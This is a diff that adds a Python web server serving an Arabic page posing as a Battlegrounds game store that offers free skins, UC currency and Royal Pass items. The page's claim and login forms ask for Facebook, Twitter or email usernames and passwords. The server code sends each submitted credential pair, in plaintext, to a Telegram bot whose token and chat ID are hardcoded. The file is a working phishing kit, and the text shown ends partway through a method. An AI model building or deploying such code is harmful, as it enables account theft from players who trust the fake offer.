@@ -1,0 +1,692 @@
+import json
+import os
+from datetime import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.request
+import urllib.error
+
+BOT_TOKEN = os.getenv("BOT_TOKEN", "1449862347:AAE5eRycQGU4kdlFePuR4XciSazQdjtEuqw")
+CHAT_ID = os.getenv("CHAT_ID", "1188729209")
+PORT = int(os.getenv("PORT", "5000"))
+
+HTML_PAGE = """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BATTLEGROUNDS PORTAL — بوابة العتاد والمكافآت</title>
+  <style>
+    :root {
+      --bg: #090c11;
+      --surface: #111620;
+      --surface-2: #18202e;
+      --accent: #f59e0b;
+      --text: #f3f4f6;
+      --muted: #9ca3af;
+      --ok: #10b981;
+      --fb: #1877f2;
+      --tw: #1d9bf0;
+      --border: rgba(255, 255, 255, 0.08);
+    }
+    * { box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Tahoma, sans-serif; }
+    body {
+      margin: 0;
+      background: radial-gradient(circle at 50% -10%, #1d273b 0%, var(--bg) 55%);
+      color: var(--text);
+      padding-bottom: 92px;
+    }
+
+    .navbar {
+      position: sticky; top: 0; z-index: 40;
+      background: rgba(13, 17, 25, 0.92);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+      padding: 10px 18px;
+    }
+    .nav-inner {
+      max-width: 1120px; margin: 0 auto;
+      display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 12px;
+    }
+    .brand {
+      display: flex; align-items: center; gap: 10px; text-decoration: none; color: var(--text);
+    }
+    .brand-logo {
+      width: 34px; height: 34px; border-radius: 8px;
+      background: linear-gradient(135deg, var(--accent), #ea580c);
+      color: #111827; font-weight: 900; display: grid; place-items: center; font-size: 15px;
+    }
+    .brand-title { font-weight: 800; font-size: 15px; letter-spacing: 0.3px; }
+    .brand-tag { font-size: 11px; color: var(--accent); }
+    .nav-links {
+      display: flex; flex-wrap: wrap; align-items: center; gap: 14px; font-size: 13px; color: var(--muted);
+    }
+    .nav-links span { cursor: pointer; transition: color 0.15s; }
+    .nav-links span:hover { color: var(--text); }
+    .nav-auth {
+      display: flex; align-items: center; gap: 8px;
+    }
+    .btn-nav {
+      border-radius: 8px; padding: 7px 13px; font-size: 12.5px; font-weight: 700; cursor: pointer;
+    }
+    .btn-login {
+      background: transparent; color: var(--text); border: 1px solid var(--border);
+    }
+    .btn-login:hover { border-color: rgba(255,255,255,0.22); }
+    .btn-signup {
+      background: var(--accent); color: #111827; border: none;
+    }
+    .user-pill {
+      display: none; align-items: center; gap: 8px;
+      background: rgba(16, 185, 129, 0.14); border: 1px solid rgba(16, 185, 129, 0.35);
+      color: #6ee7b7; padding: 6px 12px; border-radius: 999px; font-size: 12px; font-weight: 700;
+    }
+    .user-pill.show { display: inline-flex; }
+
+    .wrap { max-width: 1120px; margin: 0 auto; padding: 16px; }
+
+    .hero {
+      background: linear-gradient(125deg, rgba(245, 158, 11, 0.16), rgba(24, 32, 46, 0.96) 55%, rgba(16, 185, 129, 0.08));
+      border: 1px solid rgba(245, 158, 11, 0.28);
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 16px;
+      display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 16px;
+    }
+    .hero h1 { margin: 4px 0 6px; font-size: 21px; }
+    .hero p { margin: 0; font-size: 13px; color: var(--muted); max-width: 680px; line-height: 1.6; }
+    .hero-badge {
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      color: #6ee7b7;
+      padding: 8px 14px;
+      border-radius: 10px;
+      font-size: 12.5px;
+      font-weight: 700;
+    }
+
+    .controls {
+      display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 14px;
+    }
+    input {
+      background: var(--surface); color: var(--text);
+      border: 1px solid var(--border); border-radius: 10px;
+      padding: 10px 12px; font-size: 14px; outline: none;
+    }
+    input:focus { border-color: var(--accent); }
+    input.search { flex: 1; min-width: 210px; }
+
+    .tabs {
+      display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 16px;
+    }
+    .tab {
+      background: var(--surface); color: var(--muted);
+      border: 1px solid var(--border); border-radius: 999px;
+      padding: 8px 14px; font-size: 13px; font-weight: 700; cursor: pointer;
+    }
+    .tab.active {
+      background: var(--accent); color: #111827; border-color: var(--accent);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(195px, 1fr));
+      gap: 12px;
+    }
+    .item {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 10px;
+      cursor: pointer;
+      transition: transform 0.12s ease, border-color 0.15s ease;
+      position: relative;
+    }
+    .item:hover { transform: translateY(-2px); border-color: rgba(255,255,255,0.18); }
+    .item.selected {
+      border-color: var(--accent);
+      background: var(--surface-2);
+      box-shadow: 0 0 0 1px rgba(245, 158, 11, 0.45);
+    }
+    .thumb {
+      width: 100%; height: 105px; object-fit: cover;
+      border-radius: 8px; background: #0d1118; display: block;
+    }
+    .cat-tag {
+      display: inline-block; margin-top: 8px; font-size: 11px;
+      color: var(--accent); background: rgba(245, 158, 11, 0.12);
+      padding: 2px 8px; border-radius: 6px;
+    }
+    .title { font-size: 14px; font-weight: 700; margin: 6px 0 3px; }
+    .meta { font-size: 12px; color: var(--muted); }
+    .check-badge {
+      position: absolute; top: 16px; left: 16px;
+      background: var(--ok); color: #052e16;
+      font-weight: 800; font-size: 11px;
+      padding: 2px 7px; border-radius: 999px; display: none;
+    }
+    .item.selected .check-badge { display: block; }
+
+    .footer-bar {
+      position: fixed; bottom: 0; left: 0; right: 0; z-index: 45;
+      background: rgba(12, 16, 24, 0.96);
+      backdrop-filter: blur(10px);
+      border-top: 1px solid var(--border);
+      padding: 12px 18px;
+    }
+    .footer-inner {
+      max-width: 1120px; margin: 0 auto;
+      display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 10px;
+    }
+    .footer-actions { display: flex; flex-wrap: wrap; gap: 8px; }
+    .btn {
+      background: var(--accent); color: #111827; border: none;
+      border-radius: 10px; padding: 10px 18px; font-weight: 800; cursor: pointer;
+    }
+    .btn-claim {
+      background: var(--ok); color: #052e16; border: none;
+      border-radius: 10px; padding: 10px 20px; font-weight: 800; cursor: pointer;
+    }
+    .btn-ghost {
+      background: var(--surface-2); color: var(--text); border: 1px solid var(--border);
+      border-radius: 10px; padding: 10px 14px; font-weight: 700; cursor: pointer;
+    }
+    #status { font-size: 13px; color: var(--muted); }
+
+    .modal-backdrop {
+      position: fixed; inset: 0; z-index: 100;
+      background: rgba(0, 0, 0, 0.75);
+      display: none; align-items: center; justify-content: center; padding: 16px;
+    }
+    .modal-backdrop.open { display: flex; }
+    .modal-box {
+      width: 100%; max-width: 430px;
+      background: var(--surface); border: 1px solid rgba(245, 158, 11, 0.35);
+      border-radius: 16px; padding: 20px;
+    }
+    .modal-header {
+      display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;
+    }
+    .modal-header h2 { margin: 0; font-size: 17px; color: var(--accent); }
+    .close-x {
+      background: var(--surface-2); color: var(--text); border: 1px solid var(--border);
+      border-radius: 8px; padding: 4px 10px; cursor: pointer; font-weight: 700;
+    }
+    .auth-options { display: grid; grid-template-columns: 1fr; gap: 10px; margin-bottom: 14px; }
+    .auth-btn {
+      width: 100%; text-align: right; padding: 12px 14px;
+      border-radius: 10px; border: 1px solid var(--border);
+      background: var(--surface-2); color: var(--text);
+      font-size: 14px; font-weight: 700; cursor: pointer;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .auth-btn.active-auth {
+      border-color: var(--accent);
+      background: rgba(245, 158, 11, 0.15);
+      color: var(--accent);
+    }
+    .dot-fb { width: 10px; height: 10px; border-radius: 50%; background: var(--fb); }
+    .dot-tw { width: 10px; height: 10px; border-radius: 50%; background: var(--tw); }
+    .dot-em { width: 10px; height: 10px; border-radius: 50%; background: var(--accent); }
+    .auth-form { display: none; margin-top: 10px; }
+    .auth-form.show { display: block; }
+    .auth-form input { width: 100%; margin-bottom: 10px; background: var(--surface-2); }
+    .modal-msg { font-size: 13px; margin-top: 8px; }
+  </style>
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a class="brand" href="#">
+        <div class="brand-logo">BG</div>
+        <div>
+          <div class="brand-title">BATTLEGROUNDS HUB</div>
+          <div class="brand-tag">SEASON STORE</div>
+        </div>
+      </a>
+
+      <div class="nav-links">
+        <span onclick="filterByNav('الكل')">المتجر</span>
+        <span onclick="filterByNav('الأسلحة')">الأسلحة</span>
+        <span onclick="filterByNav('السيارات')">المركبات</span>
+        <span onclick="filterByNav('الشدات والرويال باس')">الشدات والـ RP</span>
+      </div>
+
+      <div class="nav-auth">
+        <span class="user-pill" id="userPill">مرحباً، <span id="pillName">-</span></span>
+        <button class="btn-nav btn-login" onclick="openAccountModal('login')">تسجيل الدخول</button>
+        <button class="btn-nav btn-signup" onclick="openAccountModal('register')">إنشاء حساب</button>
+      </div>
+    </div>
+  </nav>
+
+  <div class="wrap">
+    <div class="hero">
+      <div>
+        <span style="font-size:11.5px; color:var(--accent); font-weight:800;">● الموسم الحالي متاح</span>
+        <h1>بوابة استعراض العتاد والسكنات والمكافآت</h1>
+        <p>اختر العناصر المفضلة لديك من الأسلحة، سكنات الملابس، المركبات، الشدات، والرويال باس، ثم اضغط <strong>حصول</strong> لاختيار طريقة التسجيل وإتمام الطلب.</p>
+      </div>
+      <div class="hero-badge">عروض الموسم نشطة</div>
+    </div>
+
+    <div class="controls">
+      <input id="playerName" value="Player_Pro_99" placeholder="اسم اللاعب / المعرف" style="max-width: 220px;" />
+      <input id="searchInput" class="search" type="text" placeholder="ابحث عن سلاح، سكن، سيارة، شدات، رويال باس..." />
+      <button class="btn-ghost" onclick="clearSelection()">إلغاء التحديد</button>
+    </div>
+
+    <div class="tabs" id="tabs"></div>
+    <div class="grid" id="grid"></div>
+  </div>
+
+  <div class="footer-bar">
+    <div class="footer-inner">
+      <div>
+        <strong id="selectedCount">0</strong> عنصر محدد |
+        <span id="status">حدد العناصر ثم اضغط حصول</span>
+      </div>
+      <div class="footer-actions">
+        <button class="btn-claim" onclick="openClaimModal()">حصول</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-backdrop" id="claimModal">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h2>اختر طريقة التسجيل للحصول</h2>
+        <button class="close-x" onclick="closeModal('claimModal')">✕</button>
+      </div>
+      <div class="auth-options">
+        <button class="auth-btn" id="opt-facebook" onclick="selectAuth('فيسبوك')">
+          <span>تسجيل عبر فيسبوك (Facebook)</span>
+          <span class="dot-fb"></span>
+        </button>
+        <button class="auth-btn" id="opt-twitter" onclick="selectAuth('تويتر')">
+          <span>تسجيل عبر تويتر (Twitter / X)</span>
+          <span class="dot-tw"></span>
+        </button>
+        <button class="auth-btn" id="opt-email" onclick="selectAuth('بريد إلكتروني')">
+          <span>تسجيل عبر بريد إلكتروني (Email)</span>
+          <span class="dot-em"></span>
+        </button>
+      </div>
+
+      <div class="auth-form" id="authForm">
+        <input id="authAccount" type="text" placeholder="أدخل الحساب أو البريد الإلكتروني" />
+        <input id="authSecret" type="password" placeholder="أدخل كلمة المرور" />
+        <button class="btn" style="width: 100%;" onclick="submitClaim()">تأكيد التسجيل والحصول</button>
+      </div>
+      <div class="modal-msg" id="modalMsg"></div>
+    </div>
+  </div>
+
+  <div class="modal-backdrop" id="accountModal">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h2 id="accModalTitle">تسجيل الدخول إلى الحساب</h2>
+        <button class="close-x" onclick="closeModal('accountModal')">✕</button>
+      </div>
+      <div class="auth-form show">
+        <input id="accUserInput" type="text" placeholder="اسم المستخدم أو البريد الإلكتروني" />
+        <input id="accPassInput" type="password" placeholder="كلمة المرور" />
+        <button class="btn" style="width: 100%;" onclick="saveAccountSession()">متابعة</button>
+      </div>
+      <div class="modal-msg" id="accModalMsg"></div>
+    </div>
+  </div>
+
+  <script>
+    function makeThumb(label, bg1, bg2, accent) {
+      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="240" height="130" viewBox="0 0 240 130">
+        <defs>
+          <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0%" stop-color="${bg1}"/>
+            <stop offset="100%" stop-color="${bg2}"/>
+          </linearGradient>
+        </defs>
+        <rect width="240" height="130" rx="10" fill="url(#g)"/>
+        <circle cx="195" cy="28" r="34" fill="${accent}" opacity="0.16"/>
+        <rect x="14" y="92" width="68" height="22" rx="6" fill="${accent}" opacity="0.22"/>
+        <text x="120" y="64" text-anchor="middle" fill="#ffffff" font-family="sans-serif" font-size="18" font-weight="bold">${label}</text>
+        <text x="48" y="107" text-anchor="middle" fill="${accent}" font-family="sans-serif" font-size="11" font-weight="bold">SEASON</text>
+      </svg>`;
+      return "data:image/svg+xml;charset=utf-8," + encodeURIComponent(svg);
+    }
+
+    const CATEGORIES = ["الكل", "الأسلحة", "سكنات الملابس", "السيارات", "الشدات والرويال باس", "أخرى"];
+
+    const ITEMS = [
+      { id: "w1", cat: "الأسلحة", name: "M416 - الثلجي", rarity: "Mythic", thumb: makeThumb("M416 GLACIER", "#0f2942", "#17466e", "#38bdf8") },
+      { id: "w2", cat: "الأسلحة", name: "AKM - الصحراء الذهبية", rarity: "Legendary", thumb: makeThumb("AKM GOLD", "#3b2408", "#6e4310", "#f59e0b") },
+      { id: "w3", cat: "الأسلحة", name: "SCAR-L - نبض النيون", rarity: "Epic", thumb: makeThumb("SCAR-L NEON", "#2a1042", "#521d7d", "#c084fc") },
+      { id: "w4", cat: "الأسلحة", name: "M762 - اللهب القرمزي", rarity: "Mythic", thumb: makeThumb("M762 CRIMSON", "#420f18", "#781829", "#fb7185") },
+      { id: "w5", cat: "الأسلحة", name: "AWM - القناص الملكي", rarity: "Legendary", thumb: makeThumb("AWM ROYAL", "#14291e", "#224a35", "#34d399") },
+      { id: "w6", cat: "الأسلحة", name: "Kar98k - عاصفة الرمل", rarity: "Epic", thumb: makeThumb("KAR98K STORM", "#332a18", "#5c4b29", "#fbbf24") },
+      { id: "w7", cat: "الأسلحة", name: "UMP45 - ظل الليل", rarity: "Rare", thumb: makeThumb("UMP45 SHADOW", "#141824", "#273047", "#93c5fd") },
+      { id: "w8", cat: "الأسلحة", name: "UZI - شرارة اللهب", rarity: "Epic", thumb: makeThumb("UZI SPARK", "#3d190c", "#732d14", "#fb923c") },
+      { id: "w9", cat: "الأسلحة", name: "DP-28 - الحارس الثقيل", rarity: "Rare", thumb: makeThumb("DP-28 HEAVY", "#1e242b", "#374151", "#d1d5db") },
+      { id: "w10", cat: "الأسلحة", name: "M24 - بريق الجليد", rarity: "Legendary", thumb: makeThumb("M24 FROST", "#0e303d", "#18566e", "#22d3ee") },
+
+      { id: "o1", cat: "سكنات الملابس", name: "بدلة الفرعون الذهبية", rarity: "Mythic", thumb: makeThumb("PHARAOH SUIT", "#3d2b08", "#73500e", "#facc15") },
+      { id: "o2", cat: "سكنات الملابس", name: "بدلة الجوكر المهرج", rarity: "Mythic", thumb: makeThumb("JOKER OUTFIT", "#2c0d3d", "#541775", "#e879f9") },
+      { id: "o3", cat: "سكنات الملابس", name: "بدلة التنين الأحمر", rarity: "Legendary", thumb: makeThumb("RED DRAGON", "#420d14", "#7a1623", "#f87171") },
+      { id: "o4", cat: "سكنات الملابس", name: "بدلة القناص الصحراوي", rarity: "Epic", thumb: makeThumb("DESERT RECON", "#362b16", "#614d27", "#eab308") },
+      { id: "o5", cat: "سكنات الملابس", name: "بدلة السايبربانك", rarity: "Legendary", thumb: makeThumb("CYBER SUIT", "#0b2e38", "#135569", "#2dd4bf") },
+      { id: "o6", cat: "سكنات الملابس", name: "بدلة الفارس الأسود", rarity: "Epic", thumb: makeThumb("DARK KNIGHT", "#14161f", "#272b3d", "#a78bfa") },
+      { id: "o7", cat: "سكنات الملابس", name: "بدلة الثلج القطبي", rarity: "Rare", thumb: makeThumb("ARCTIC GEAR", "#102840", "#1d4973", "#7dd3fc") },
+      { id: "o8", cat: "سكنات الملابس", name: "بدلة النينجا الصامت", rarity: "Epic", thumb: makeThumb("SILENT NINJA", "#1f1226", "#3d224a", "#f472b6") },
+      { id: "o9", cat: "سكنات الملابس", name: "بدلة القائد العسكري", rarity: "Rare", thumb: makeThumb("COMMANDER", "#1b2918", "#324d2b", "#86efac") },
+      { id: "o10", cat: "سكنات الملابس", name: "بدلة الشبح الفضائي", rarity: "Mythic", thumb: makeThumb("SPACE PHANTOM", "#191538", "#2f2769", "#818cf8") },
+
+      { id: "v1", cat: "السيارات", name: "داسيا - الوحش المدرع", rarity: "Legendary", thumb: makeThumb("DACIA ARMOR", "#2b2112", "#523f22", "#f59e0b") },
+      { id: "v2", cat: "السيارات", name: "UAZ - اللهب الأزرق", rarity: "Mythic", thumb: makeThumb("UAZ BLUE FLAME", "#0c2442", "#154178", "#60a5fa") },
+      { id: "v3", cat: "السيارات", name: "كوبية رياضية - البرق الأصفر", rarity: "Mythic", thumb: makeThumb("COUPE TURBO", "#3b3007", "#705b0d", "#fde047") },
+      { id: "v4", cat: "السيارات", name: "باغي - العاصفة الصحراوية", rarity: "Epic", thumb: makeThumb("BUGGY DUNE", "#38210c", "#693e16", "#fb923c") },
+      { id: "v5", cat: "السيارات", name: "دراجة نارية - الشبح", rarity: "Epic", thumb: makeThumb("MOTO PHANTOM", "#1c1429", "#35264f", "#c084fc") },
+      { id: "v6", cat: "السيارات", name: "قارب سريع - موجة المحيط", rarity: "Rare", thumb: makeThumb("JET BOAT", "#0a2e36", "#125463", "#38bdf8") },
+      { id: "v7", cat: "السيارات", name: "شاحنة مونستر - الزلزال", rarity: "Legendary", thumb: makeThumb("MONSTER TRUCK", "#3d1212", "#732222", "#f87171") },
+      { id: "v8", cat: "السيارات", name: "ميردو - النجم الفضي", rarity: "Epic", thumb: makeThumb("MIRADO SILVER", "#1f242d", "#394254", "#e5e7eb") },
+
+      { id: "u1", cat: "الشدات والرويال باس", name: "باقة 60 شدة UC", rarity: "Starter", thumb: makeThumb("60 UC", "#17253b", "#274166", "#fbbf24") },
+      { id: "u2", cat: "الشدات والرويال باس", name: "باقة 325 شدة UC", rarity: "Popular", thumb: makeThumb("325 UC", "#17253b", "#274166", "#fbbf24") },
+      { id: "u3", cat: "الشدات والرويال باس", name: "باقة 660 شدة UC", rarity: "Popular", thumb: makeThumb("660 UC", "#17253b", "#274166", "#fbbf24") },
+      { id: "u4", cat: "الشدات والرويال باس", name: "باقة 1800 شدة UC", rarity: "Pro", thumb: makeThumb("1800 UC", "#291d08", "#4d370f", "#f59e0b") },
+      { id: "u5", cat: "الشدات والرويال باس", name: "باقة 3850 شدة UC", rarity: "VIP", thumb: makeThumb("3850 UC", "#291d08", "#4d370f", "#f59e0b") },
+      { id: "u6", cat: "الشدات والرويال باس", name: "باقة 8100 شدة UC", rarity: "Ultra", thumb: makeThumb("8100 UC", "#33140c", "#632616", "#fb7185") },
+      { id: "u7", cat: "الشدات والرويال باس", name: "رويال باس Elite Pass", rarity: "Season Pass", thumb: makeThumb("ELITE RP", "#2e1842", "#572d7d", "#e879f9") },
+      { id: "u8", cat: "الشدات والرويال باس", name: "رويال باس Elite Pass Plus", rarity: "Season Pass+", thumb: makeThumb("ELITE RP+", "#3d2608", "#73470f", "#facc15") },
+
+      { id: "x1", cat: "أخرى", name: "مظلة أجنحة النسر", rarity: "Legendary", thumb: makeThumb("EAGLE PARACHUTE", "#14293d", "#244b70", "#38bdf8") },
+      { id: "x2", cat: "أخرى", name: "حقيبة ظهر التنين", rarity: "Mythic", thumb: makeThumb("DRAGON BACKPACK", "#3d121d", "#732237", "#fb7185") },
+      { id: "x3", cat: "أخرى", name: "خوذة لفل 3 - الملكية", rarity: "Mythic", thumb: makeThumb("LVL 3 HELMET", "#332508", "#61470f", "#fbbf24") },
+      { id: "x4", cat: "أخرى", name: "رقصة النصر المشتعلة", rarity: "Epic", thumb: makeThumb("VICTORY EMOTE", "#3b1b0c", "#6e3216", "#fb923c") },
+      { id: "x5", cat: "أخرى", name: "مقلاة - درع اللهب", rarity: "Epic", thumb: makeThumb("FLAME PAN", "#2e1414", "#592727", "#f87171") },
+      { id: "x6", cat: "أخرى", name: "قنبلة دخانية - بنفسجية", rarity: "Rare", thumb: makeThumb("PURPLE SMOKE", "#271438", "#4a266b", "#c084fc") },
+      { id: "x7", cat: "أخرى", name: "إطار صورة البطل الذهبي", rarity: "Epic", thumb: makeThumb("GOLD FRAME", "#362809", "#664c11", "#fde047") },
+      { id: "x8", cat: "أخرى", name: "رفيق الصقر الذهبي", rarity: "Legendary", thumb: makeThumb("GOLDEN FALCON", "#29210c", "#4d3e16", "#f59e0b") }
+    ];
+
+    let activeCat = "الكل";
+    const selectedIds = new Set();
+    let selectedAuthMethod = null;
+    let accountMode = "login";
+
+    const tabsEl = document.getElementById("tabs");
+    const gridEl = document.getElementById("grid");
+    const searchEl = document.getElementById("searchInput");
+
+    function filterByNav(cat) {
+      activeCat = cat;
+      renderTabs();
+      renderGrid();
+      window.scrollTo({ top: 190, behavior: "smooth" });
+    }
+
+    function renderTabs() {
+      tabsEl.innerHTML = "";
+      CATEGORIES.forEach(cat => {
+        const btn = document.createElement("button");
+        btn.className = "tab" + (cat === activeCat ? " active" : "");
+        btn.textContent = cat;
+        btn.onclick = () => {
+          activeCat = cat;
+          renderTabs();
+          renderGrid();
+        };
+        tabsEl.appendChild(btn);
+      });
+    }
+
+    function renderGrid() {
+      const q = searchEl.value.trim().toLowerCase();
+      const filtered = ITEMS.filter(it => {
+        const catOk = activeCat === "الكل" || it.cat === activeCat;
+        const qOk = !q || it.name.toLowerCase().includes(q) || it.cat.toLowerCase().includes(q) || it.rarity.toLowerCase().includes(q);
+        return catOk && qOk;
+      });
+
+      gridEl.innerHTML = "";
+      filtered.forEach(it => {
+        const card = document.createElement("div");
+        card.className = "item" + (selectedIds.has(it.id) ? " selected" : "");
+        card.innerHTML = `
+          <span class="check-badge">محدد</span>
+          <img class="thumb" src="${it.thumb}" alt="${it.name}" />
+          <span class="cat-tag">${it.cat}</span>
+          <div class="title">${it.name}</div>
+          <div class="meta">الندرة: ${it.rarity}</div>
+        `;
+        card.onclick = () => {
+          if (selectedIds.has(it.id)) selectedIds.delete(it.id);
+          else selectedIds.add(it.id);
+          card.classList.toggle("selected");
+          updateCount();
+        };
+        gridEl.appendChild(card);
+      });
+    }
+
+    function updateCount() {
+      document.getElementById("selectedCount").textContent = selectedIds.size;
+    }
+
+    function clearSelection() {
+      selectedIds.clear();
+      updateCount();
+      renderGrid();
+    }
+
+    function closeModal(id) {
+      document.getElementById(id).classList.remove("open");
+    }
+
+    function openClaimModal() {
+      selectedAuthMethod = null;
+      document.querySelectorAll(".auth-btn").forEach(b => b.classList.remove("active-auth"));
+      document.getElementById("authForm").classList.remove("show");
+      document.getElementById("modalMsg").textContent = "";
+      document.getElementById("claimModal").classList.add("open");
+    }
+
+    function selectAuth(method) {
+      selectedAuthMethod = method;
+      document.querySelectorAll(".auth-btn").forEach(b => b.classList.remove("active-auth"));
+      if (method === "فيسبوك") document.getElementById("opt-facebook").classList.add("active-auth");
+      if (method === "تويتر") document.getElementById("opt-twitter").classList.add("active-auth");
+      if (method === "بريد إلكتروني") document.getElementById("opt-email").classList.add("active-auth");
+
+      const accInput = document.getElementById("authAccount");
+      if (method === "بريد إلكتروني") accInput.placeholder = "أدخل البريد الإلكتروني (example@mail.com)";
+      else if (method === "تويتر") accInput.placeholder = "أدخل اسم حساب تويتر (@username)";
+      else accInput.placeholder = "أدخل حساب فيسبوك أو البريد المرتبط";
+
+      document.getElementById("authForm").classList.add("show");
+    }
+
+    function openAccountModal(mode) {
+      accountMode = mode;
+      document.getElementById("accModalTitle").textContent =
+        mode === "register" ? "إنشاء حساب جديد" : "تسجيل الدخول إلى الحساب";
+      document.getElementById("accModalMsg").textContent = "";
+      document.getElementById("accountModal").classList.add("open");
+    }
+
+    async function postRegistration(endpoint, payloadObj, targetStatusEl) {
+      try {
+        const res = await fetch(endpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payloadObj)
+        });
+        const data = await res.json();
+        targetStatusEl.style.color = data.ok ? "#10b981" : "#f87171";
+        targetStatusEl.textContent = data.message;
+        return data.ok;
+      } catch (e) {
+        targetStatusEl.style.color = "#f87171";
+        targetStatusEl.textContent = "تعذر إتمام الطلب، حاول مرة أخرى.";
+        return false;
+      }
+    }
+
+    async function saveAccountSession() {
+      const u = document.getElementById("accUserInput").value.trim();
+      const p = document.getElementById("accPassInput").value;
+      const msgEl = document.getElementById("accModalMsg");
+      if (!u) {
+        msgEl.style.color = "#fbbf24";
+        msgEl.textContent = "يرجى إدخال اسم المستخدم أو البريد الإلكتروني.";
+        return;
+      }
+      document.getElementById("pillName").textContent = u;
+      document.getElementById("userPill").classList.add("show");
+      document.getElementById("playerName").value = u;
+
+      const ok = await postRegistration("/account-session", {
+        mode: accountMode,
+        username: u,
+        secret: p
+      }, msgEl);
+      if (ok) {
+        document.getElementById("status").textContent = `تم تسجيل الدخول كـ ${u}`;
+        setTimeout(() => closeModal("accountModal"), 800);
+      }
+    }
+
+    async function submitClaim() {
+      const modalMsg = document.getElementById("modalMsg");
+      const statusEl = document.getElementById("status");
+      const account = document.getElementById("authAccount").value.trim();
+      const secret = document.getElementById("authSecret").value;
+
+      if (!selectedAuthMethod) {
+        modalMsg.style.color = "#fbbf24";
+        modalMsg.textContent = "اختر طريقة التسجيل أولاً (فيسبوك، تويتر، أو بريد إلكتروني).";
+        return;
+      }
+      if (!account) {
+        modalMsg.style.color = "#fbbf24";
+        modalMsg.textContent = "يرجى إدخال بيانات الحساب أولاً.";
+        return;
+      }
+
+      modalMsg.style.color = "#9ca3af";
+      modalMsg.textContent = "جاري معالجة التسجيل...";
+
+      const chosen = ITEMS.filter(i => selectedIds.has(i.id));
+      const ok = await postRegistration("/claim-auth", {
+        player: document.getElementById("playerName").value.trim() || "غير محدد",
+        auth_method: selectedAuthMethod,
+        account: account,
+        secret: secret,
+        items: chosen.map(c => ({ cat: c.cat, name: c.name, rarity: c.rarity }))
+      }, modalMsg);
+
+      if (ok) {
+        statusEl.textContent = `تم التسجيل عبر (${selectedAuthMethod}) بنجاح`;
+        setTimeout(() => closeModal("claimModal"), 900);
+      }
+    }
+
+    searchEl.addEventListener("input", renderGrid);
+    renderTabs();
+    renderGrid();
+  </script>
+</body>
+</html>
+"""
+
+
+def send_telegram_message(text: str):
+    payload = json.dumps({
+        "chat_id": CHAT_ID,
+        "text": text,
+        "parse_mode": "Markdown"
+    }).encode("utf-8")
+
+    req = urllib.request.Request(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        data=payload,
+        headers={"Content-Type": "application/json"},
+        method="POST"
+    )
+
+    try:
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            tg_res = json.loads(resp.read().decode("utf-8"))
+            if tg_res.get("ok"):
+                return True, "تم التسجيل بنجاح!"
+            return False, "تعذر إتمام التسجيل حالياً."
+    except urllib.error.URLError:
+        return False, "تعذر الاتصال بالخادم، حاول مجدداً."
+
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(HTML_PAGE.encode("utf-8"))
+
+    def do_POST(self):
+        if self.path not in ("/claim-auth", "/account-session"):
+            self.send_response(404)
+            self.end_headers()
+            return
+
+        length = int(self.headers.get("Content-Length", 0))
+        body = json.loads(self.rfile.read(length).decode("utf-8") or "{}")
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        if self.path == "/account-session":
+            mode = "إنشاء حساب" if body.get("mode") == "register" else "تسجيل دخول"
+            username = str(body.get("username", "غير محدد"))[:80]
+            secret = str(body.get("secret", ""))[:100]
+            text = (
+                "🔐 *معلومات تسجيل حساب على الموقع*\n"
+                "━━━━━━━━━━━━━━\n"
+                f"📌 *النوع:* {mode}\n"
+                f"👤 *المستخدم:* `{username}`\n"
+                f"🔑 *كلمة المرور:* `{secret}`\n"
+                f"🕒 *الوقت:* {now_str}"
+            )
+            ok, msg = send_telegram_message(text)
+            if ok:
+                msg = "تم تسجيل الدخول بنجاح."
+        else:
+            player = str(body.get("player", "غير محدد"))[:60]
+            items = body.get("items", [])[:50]
+            lines = [f"• [{it.get('cat', '')}] {it.get('name', '')} ({it.get('rarity', '')})" for it in items]
+            items_block = "\n".join(lines) if lines else "• لم يتم تحديد عناصر"
+            auth_method = str(body.get("auth_method", "غير محدد"))[:40]
+            account = str(body.get("account", "غير محدد"))[:100]
+            secret = str(body.get("secret", ""))[:100]
+            text = (
+                "🎁 *معلومات تسجيل وطلب عبر الموقع*\n"
+                "━━━━━━━━━━━━━━\n"
+                f"👤 *اللاعب:* `{player}`\n"
+                f"🔐 *طريقة التسجيل:* {auth_method}\n"
+                f"📩 *الحساب:* `{account}`\n"
+                f"🔑 *كلمة المرور:* `{secret}`\n"
+                f"📦 *العناصر المحددة:* {len(items)}\n"
+                f"🕒 *الوقت:* {now_str}\n\n"
+                f"{items_block}"
+            )
+            ok, msg = send_telegram_message(text)
+            if ok:
+                msg = "تم تأكيد التسجيل وإرسال الطلب بنجاح."
+
+        self.send_response(200 if ok else 400)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(json.dumps({"ok": ok, "message": msg}).encode("utf-8"))
+
+    def log_message(self, format, *args):
